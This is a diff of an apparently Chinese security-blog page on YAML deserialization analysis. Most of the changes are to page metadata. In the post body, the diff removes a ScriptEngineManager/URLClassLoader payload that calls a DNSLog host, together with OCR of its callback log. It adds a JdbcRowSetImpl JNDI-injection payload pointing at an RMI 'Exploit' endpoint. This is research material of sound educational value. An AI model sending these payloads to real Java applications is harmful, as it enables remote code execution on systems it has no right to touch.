@@ -16,14 +16,14 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="John Doe">
+  <meta name="author" content="Change">
   <meta name="keywords" content="">
   
     <meta name="description" content="Yaml介绍在学习yaml反序列化之前，我们先来讲讲yaml是什么，有什么用。 yaml全称YAML Ain’t Markup Language（一种“不是标记语言”的数据序列化格式），本质上是一种 通过缩进+符号表达层次、数组、键值对等数据结构的纯文本，扩展名为.yml 或 .yaml，常常用来写配置文件（如docker-compose.yml）或数据交换（与json类似）。例如： 123456">
 <meta property="og:type" content="article">
-<meta property="og:title" content="yaml反序列化分析">
+<meta property="og:title" content="YAML反序列化分析">
 <meta property="og:url" content="http://example.com/2025/03/07/yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="Change&#39;s blog">
 <meta property="og:description" content="Yaml介绍在学习yaml反序列化之前，我们先来讲讲yaml是什么，有什么用。 yaml全称YAML Ain’t Markup Language（一种“不是标记语言”的数据序列化格式），本质上是一种 通过缩进+符号表达层次、数组、键值对等数据结构的纯文本，扩展名为.yml 或 .yaml，常常用来写配置文件（如docker-compose.yml）或数据交换（与json类似）。例如： 123456">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/2025/1754560219800-f9d1d9c8-ff18-478e-8912-c6b483c53261.png">
@@ -33,17 +33,16 @@
 <meta property="og:image" content="http://example.com/images/2025/1754644639446-5eb8c2f8-6583-4f13-b5a6-00af33bea91c.png">
 <meta property="og:image" content="http://example.com/images/2025/1754646679520-85d09105-84f9-4aac-a979-103ef672f010.png">
 <meta property="og:image" content="http://example.com/images/2025/1754646702046-7f29e1f3-2935-4530-8a0f-be12cf9ddc28.png">
-<meta property="og:image" content="http://example.com/images/2025/1754647133028-3d07dfba-4e3d-41ed-a094-687153611db5.png">
 <meta property="article:published_time" content="2025-03-07T07:30:00.000Z">
-<meta property="article:modified_time" content="2026-03-18T01:43:56.348Z">
-<meta property="article:author" content="John Doe">
+<meta property="article:modified_time" content="2026-03-18T06:46:55.314Z">
+<meta property="article:author" content="Change">
 <meta property="article:tag" content="安全研究">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/2025/1754560219800-f9d1d9c8-ff18-478e-8912-c6b483c53261.png">
   
   
   
-  <title>yaml反序列化分析 - Hexo</title>
+  <title>YAML反序列化分析 - Change&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -312,7 +311,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="yaml反序列化分析"></span>
+            <span id="subtitle" data-typed-text="YAML反序列化分析"></span>
           
         </div>
 
@@ -335,7 +334,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.2k 字
+          6.1k 字
         
       </span>
     
@@ -346,7 +345,7 @@
         
         
         
-          52 分钟
+          51 分钟
         
       </span>
     
@@ -385,7 +384,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">yaml反序列化分析</h1>
+            <h1 id="seo-header">YAML反序列化分析</h1>
             
             
               <div class="markdown-body">
@@ -500,15 +499,14 @@
 <p><img src="/images/2025/1754646679520-85d09105-84f9-4aac-a979-103ef672f010.png" srcset="/img/loading.gif" lazyload></p>
 <!-- 这是一张图片，ocr 内容为：THROWS SQLEXCEPTION ON CONNECT() PRIVATE CONNECTION  IF (THIS.CONN ! NULL) RETURN THIS.CONN; ELSE IF (THIS.GETDATASOURCENAME( (LLNU 三I TRY { INITIALCONTEXT VAR1 - NEW INITIALCONTEXT(); DATASOURCE VAR2 (DATASOURCE) VA ) VAR1.LOOKUP(THIS.GETDATASOURCENAME(); S& !THIS.GETUSERNAME().EQUALS(UU) ? VAR2.GETCONNECTION(THIS.GETUSERNAME() THIS.GETPASSW RETURN THIS.GETUSERNAME()  CATCH (NAMINGEXCEPTION VAR3) { THROW NEW SQLEXCEPTION(THIS.RESBUNDLE.HANDLESETOBJECT( S "IDBCROWSETIMPL.CONNECT"),TOSTRINGO); ELSE{ ; TLU : ( ) -->
 <p><img src="/images/2025/1754646702046-7f29e1f3-2935-4530-8a0f-be12cf9ddc28.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!javax.script.ScriptEngineManager</span> [<br>    <span class="hljs-type">!!java.net.URLClassLoader</span> [<br>         [<br>             <span class="hljs-type">!!java.net.URL</span> [<span class="hljs-string">&quot;http://1961ea1c.log.goodknow.pp.ua.&quot;</span>]<br>         ]<br>    ]<br>]<br></code></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!com.sun.rowset.JdbcRowSetImpl</span> &#123;<span class="hljs-attr">dataSourceName:</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="hljs-attr">autoCommit:</span> <span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure>
 
-<!-- 这是一张图片，ocr 内容为：DOMAIN DOMAINS LOG.GOODKNOW.PP.UA. SUBDOMAIN:1961EALC.LOG.GOODKNOW.PP.UA. TOKEN:HSGDS8WGJD54 GET SUB DOMAIN GET RESULTS (CLICK TO COPY) RESULTS TIME HOST RECORD 2025-08-08 15:51:44 172.70.205.26:41406 1961EALC.LOG-GOODKNOW.WPP.UA. 172.70.205.140:19334 2025-08-08 15:51:43 1961EALC.LOG.GOODKNOW.UA, 2025-08-08 15:51:43 172.70.205.195:56711 1961EAIC.LOG.GOODKNOW.PP.UA. 1961EALC.LOG-GOODKNOW.PP.UA, 2025-08-08 15:51:43 111.206.4.140:57385 1961EALC.LOG.GOODKNOW.PP.UA. 111.206.4.199:12261 2025-08-08 15:51:42 DNSLOG.ORG XSSTEST.COM AD:虚拟信用上 -->
-<p><img src="/images/2025/1754647133028-3d07dfba-4e3d-41ed-a094-687153611db5.png" srcset="/img/loading.gif" lazyload></p>
-<h4 id="ScriptEngineManagerl链"><a href="#ScriptEngineManagerl链" class="headerlink" title="ScriptEngineManagerl链"></a>ScriptEngineManager<font style="color:rgb(51, 51, 51);">l链</font></h4><p>学习这条链之前我们要了解两个前置知识</p>
-<ul>
-<li>Yaml反序列化是支持有参构造的</li>
-<li>SPI机制</li>
-</ul>
+
+
+
+
+
+
 
                 
               </div>
@@ -554,14 +552,14 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>yaml反序列化分析</div>
+      <div>YAML反序列化分析</div>
       <div>http://example.com/2025/03/07/yaml反序列化/</div>
     </div>
     <div class="license-meta">
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>John Doe</div>
+          <div>Change</div>
         </div>
       
       
